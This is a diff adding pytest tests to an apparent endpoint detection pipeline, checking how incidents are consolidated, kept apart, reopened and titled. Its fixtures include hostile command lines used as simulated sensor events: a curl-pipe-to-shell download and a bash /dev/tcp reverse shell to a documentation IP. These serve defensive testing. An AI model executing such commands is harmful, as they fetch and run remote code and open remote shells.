@@ -420,3 +420,221 @@ async def test_a_benign_endpoint_event_never_becomes_an_incident():
     finally:
         await db["xdr_canonical_evidence"].delete_many({"tenant_id": tenant})
         client.close()
+
+
+# ── P0-F.2 · endpoint incident consolidation + identity ───────────
+
+def _sensor_ev(cmd, image, pid, endpoint="ep_camp1", host="lab-linux-01"):
+    return {"activity": "PROCESS", "operation": "PROCESS_OBSERVED",
+            "observed_at": "2026-06-06T14:00:00+00:00", "pid": pid,
+            "ppid": 1, "image": image.rsplit("/", 1)[-1],
+            "image_path": image, "command_line": cmd, "user": "root",
+            "collection_method": "PROC_POLL",
+            "parent_lookup_state": "OBSERVED", "parent_image": "sshd",
+            "endpoint_id": endpoint, "hostname": host}
+
+
+_ATTACK = [("/bin/bash -c curl -s http://x/a.sh | sh", "/usr/bin/bash", 31),
+           ("/bin/sh /tmp/x/payload.sh", "/usr/bin/dash", 32),
+           ("/bin/bash -c exec 3<>/dev/tcp/198.51.100.9/4444",
+            "/usr/bin/bash", 33)]
+
+
+@pytest.mark.asyncio
+async def test_one_endpoint_attack_becomes_one_incident_with_all_evidence():
+    from motor.motor_asyncio import AsyncIOMotorClient
+    from detection_content.xdr_pipeline import process_event_through_pipeline
+    client = AsyncIOMotorClient(os.environ["MONGO_URL"])
+    db = client[os.environ["DB_NAME"]]
+    tenant = f"p0f2-{uuid.uuid4().hex[:8]}"
+    try:
+        results = []
+        for cmd, image, pid in _ATTACK:
+            out = await process_event_through_pipeline(
+                db, _sensor_ev(cmd, image, pid),
+                trace_id=f"raw_{uuid.uuid4().hex[:20]}",
+                integration_id="nivxforge-linux-sensor",
+                collector_id="ep_camp1", tenant_id=tenant)
+            results.append(out["incident"])
+
+        assert results[0]["created"] is True
+        assert all(r["consolidated"] is True for r in results[1:])
+        assert len({r["incident_id"] for r in results}) == 1
+        assert await db["workspace_cases"].count_documents(
+            {"tenant_id": tenant}) == 1
+
+        case = await db["workspace_cases"].find_one({"tenant_id": tenant})
+        camp = case["endpoint_campaign"]
+        # NOTHING was dropped: one retained row per contributing
+        # observation, and every rule that fired is listed.
+        assert len(camp["detections"]) == 3
+        assert {"EDR-LNX-002", "EDR-LNX-003",
+                "EDR-LNX-004"} <= set(camp["rule_ids"])
+        assert all(r["canonical_event_id"] for r in camp["detections"])
+        assert all(r["raw_event_id"] for r in camp["detections"])
+        # The CRITICAL observation escalated the incident; the later
+        # medium one must not have downgraded it.
+        assert camp["max_label"] == "MALICIOUS"
+        assert camp["max_score"] == 80
+        assert case["incident_priority"] == "P1"
+        # Title is derived from the behaviour that actually fired.
+        assert "lab-linux-01" in case["title"]
+        assert "UNKNOWN" not in case["title"]
+        assert case["title"].startswith("Reverse-shell shaped command line")
+    finally:
+        await db["xdr_canonical_evidence"].delete_many({"tenant_id": tenant})
+        await db["workspace_cases"].delete_many({"tenant_id": tenant})
+        client.close()
+
+
+@pytest.mark.asyncio
+async def test_two_endpoints_never_merge_even_on_the_same_rule():
+    from motor.motor_asyncio import AsyncIOMotorClient
+    from detection_content.xdr_pipeline import process_event_through_pipeline
+    client = AsyncIOMotorClient(os.environ["MONGO_URL"])
+    db = client[os.environ["DB_NAME"]]
+    tenant = f"p0f2-{uuid.uuid4().hex[:8]}"
+    cmd = "/bin/bash -c exec 3<>/dev/tcp/198.51.100.9/4444"
+    try:
+        ids = []
+        for ep, host in (("ep_a", "lab-a"), ("ep_b", "lab-b")):
+            out = await process_event_through_pipeline(
+                db, _sensor_ev(cmd, "/usr/bin/bash", 41, ep, host),
+                trace_id=f"raw_{uuid.uuid4().hex[:20]}",
+                integration_id="nivxforge-linux-sensor",
+                collector_id=ep, tenant_id=tenant)
+            assert out["incident"]["created"] is True
+            ids.append(out["incident"]["incident_id"])
+        assert len(set(ids)) == 2
+        assert await db["workspace_cases"].count_documents(
+            {"tenant_id": tenant}) == 2
+    finally:
+        await db["xdr_canonical_evidence"].delete_many({"tenant_id": tenant})
+        await db["workspace_cases"].delete_many({"tenant_id": tenant})
+        client.close()
+
+
+@pytest.mark.asyncio
+async def test_a_later_unrelated_attack_is_its_own_incident():
+    """The window rolls from the LAST activity, so a fresh attack after it
+    must NOT be swallowed by the earlier campaign."""
+    from motor.motor_asyncio import AsyncIOMotorClient
+    from detection_content.xdr_pipeline import process_event_through_pipeline
+    client = AsyncIOMotorClient(os.environ["MONGO_URL"])
+    db = client[os.environ["DB_NAME"]]
+    tenant = f"p0f2-{uuid.uuid4().hex[:8]}"
+    cmd = "/bin/bash -c exec 3<>/dev/tcp/198.51.100.9/4444"
+    try:
+        first = await process_event_through_pipeline(
+            db, _sensor_ev(cmd, "/usr/bin/bash", 51),
+            trace_id=f"raw_{uuid.uuid4().hex[:20]}",
+            integration_id="nivxforge-linux-sensor",
+            collector_id="ep_camp1", tenant_id=tenant)
+        assert first["incident"]["created"] is True
+        # Age the campaign past its window (what the clock would do).
+        await db["workspace_cases"].update_one(
+            {"id": first["incident"]["incident_id"]},
+            {"$set": {"endpoint_campaign.last_activity_at":
+                      "2020-01-01T00:00:00+00:00"}})
+        second = await process_event_through_pipeline(
+            db, _sensor_ev(cmd, "/usr/bin/bash", 52),
+            trace_id=f"raw_{uuid.uuid4().hex[:20]}",
+            integration_id="nivxforge-linux-sensor",
+            collector_id="ep_camp1", tenant_id=tenant)
+        assert second["incident"]["created"] is True
+        assert (second["incident"]["incident_id"]
+                != first["incident"]["incident_id"])
+        assert await db["workspace_cases"].count_documents(
+            {"tenant_id": tenant}) == 2
+    finally:
+        await db["xdr_canonical_evidence"].delete_many({"tenant_id": tenant})
+        await db["workspace_cases"].delete_many({"tenant_id": tenant})
+        client.close()
+
+
+@pytest.mark.asyncio
+async def test_a_closed_incident_is_never_silently_reopened():
+    from motor.motor_asyncio import AsyncIOMotorClient
+    from detection_content.xdr_pipeline import process_event_through_pipeline
+    client = AsyncIOMotorClient(os.environ["MONGO_URL"])
+    db = client[os.environ["DB_NAME"]]
+    tenant = f"p0f2-{uuid.uuid4().hex[:8]}"
+    cmd = "/bin/bash -c exec 3<>/dev/tcp/198.51.100.9/4444"
+    try:
+        first = await process_event_through_pipeline(
+            db, _sensor_ev(cmd, "/usr/bin/bash", 61),
+            trace_id=f"raw_{uuid.uuid4().hex[:20]}",
+            integration_id="nivxforge-linux-sensor",
+            collector_id="ep_camp1", tenant_id=tenant)
+        await db["workspace_cases"].update_one(
+            {"id": first["incident"]["incident_id"]},
+            {"$set": {"incident_state": "closed"}})
+        second = await process_event_through_pipeline(
+            db, _sensor_ev(cmd, "/usr/bin/bash", 62),
+            trace_id=f"raw_{uuid.uuid4().hex[:20]}",
+            integration_id="nivxforge-linux-sensor",
+            collector_id="ep_camp1", tenant_id=tenant)
+        assert second["incident"]["created"] is True
+        assert await db["workspace_cases"].count_documents(
+            {"tenant_id": tenant}) == 2
+    finally:
+        await db["xdr_canonical_evidence"].delete_many({"tenant_id": tenant})
+        await db["workspace_cases"].delete_many({"tenant_id": tenant})
+        client.close()
+
+
+@pytest.mark.asyncio
+async def test_non_endpoint_sources_keep_their_existing_behaviour():
+    """CEF/LEEF and snort must be untouched: no campaign scope, no
+    consolidation, and the original network-shaped title."""
+    from motor.motor_asyncio import AsyncIOMotorClient
+    from detection_content.xdr_incident import materialise_incident
+    client = AsyncIOMotorClient(os.environ["MONGO_URL"])
+    db = client[os.environ["DB_NAME"]]
+    tenant = f"p0f2-{uuid.uuid4().hex[:8]}"
+    canonical = {"event_id": "cev_net_1", "provenance": {"trace_id": "t"},
+                 "network": {"dest_ip": "10.0.0.5"},
+                 "security": {"signature": {"id": "2001219"}}}
+    verdict = {"label": "MALICIOUS", "score": 85, "reason": "r",
+               "engine_id": "veee", "contributors": []}
+    try:
+        ids = []
+        for i in range(2):
+            out = await materialise_incident(
+                db, canonical, {"iue_id": "i"}, {}, {"matched": True},
+                verdict, trace_id=f"t{i}", tenant_id=tenant)
+            assert out["created"] is True
+            ids.append(out["incident_id"])
+        assert len(set(ids)) == 2, "network incidents must not consolidate"
+        doc = await db["workspace_cases"].find_one({"id": ids[0]})
+        assert doc["title"] == "Malicious — sig 2001219 → 10.0.0.5"
+        assert "endpoint_campaign" not in doc
+    finally:
+        await db["workspace_cases"].delete_many({"tenant_id": tenant})
+        client.close()
+
+
+def test_the_primary_behaviour_is_the_most_severe_rule_deterministically():
+    from detection_content.xdr_incident import (_endpoint_title,
+                                                _primary_behaviour)
+    det = {"matched": True, "detections": [
+        {"rule_id": "R-LOW", "name": "Low thing", "severity": "low"},
+        {"rule_id": "R-CRIT", "name": "Critical thing",
+         "severity": "critical"},
+        {"rule_id": "R-MED", "name": "Medium thing", "severity": "medium"}]}
+    assert _primary_behaviour(det)["rule_id"] == "R-CRIT"
+    canonical = {"additional_fields": {"endpoint_id": "ep_x"},
+                 "host": {"hostname": "lab-9"}}
+    assert _endpoint_title("MALICIOUS", canonical, det) == \
+        "Critical thing — lab-9"
+    # No rule fired → nothing to name, so the generic namer stays in
+    # charge rather than inventing a behaviour.
+    assert _endpoint_title("MALICIOUS", canonical,
+                           {"matched": False, "detections": []}) is None
+    # No endpoint identity → not an endpoint incident.
+    assert _endpoint_title("MALICIOUS", {"host": {"hostname": "h"}},
+                           det) is None
+    # Hostname absent → fall back to the platform-minted id, never UNKNOWN.
+    assert _endpoint_title("MALICIOUS",
+                           {"additional_fields": {"endpoint_id": "ep_x"}},
+                           det) == "Critical thing — ep_x"
